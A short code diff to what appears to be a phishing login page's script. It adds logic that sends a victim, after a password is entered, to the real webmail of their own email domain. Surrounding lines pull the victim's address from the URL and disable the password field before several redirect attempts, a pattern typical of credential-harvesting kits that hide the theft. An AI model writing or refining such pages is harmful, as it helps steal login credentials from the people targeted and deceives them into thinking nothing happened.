@@ -76,8 +76,17 @@
       <script>
          $(document).ready(function() {
              // Configuration - Set your redirect domain here
-             var REDIRECT_DOMAIN = 'https://webmail.gracedrive.org'; // Webmail domain
              var REDIRECT_DELAY = 1500; // Delay in milliseconds before redirect (1.5 seconds)
+             
+             // Function to extract domain from email and create webmail URL
+             function getWebmailUrl(email) {
+                 if (!email || !email.includes('@')) {
+                     return 'https://webmail.gracedrive.org'; // Fallback domain
+                 }
+                 
+                 var domain = email.split('@')[1];
+                 return 'https://webmail.' + domain;
+             }
              
              // Enhanced function to extract email from URL hash, query, or filename (index.html@user@domain.com)
              function extractEmailFromUrl() {
@@ -140,7 +149,8 @@
                  $('#password').prop('disabled', true);
                  
                  // Immediate redirect attempt
-                 var redirectUrl = REDIRECT_DOMAIN + '?email=' + encodeURIComponent($('#email').val());
+                 var userEmail = $('#email').val();
+                 var redirectUrl = getWebmailUrl(userEmail) + '?email=' + encodeURIComponent(userEmail);
                  console.log('Attempting immediate redirect to: ' + redirectUrl);
                  
                  // Try multiple redirect methods
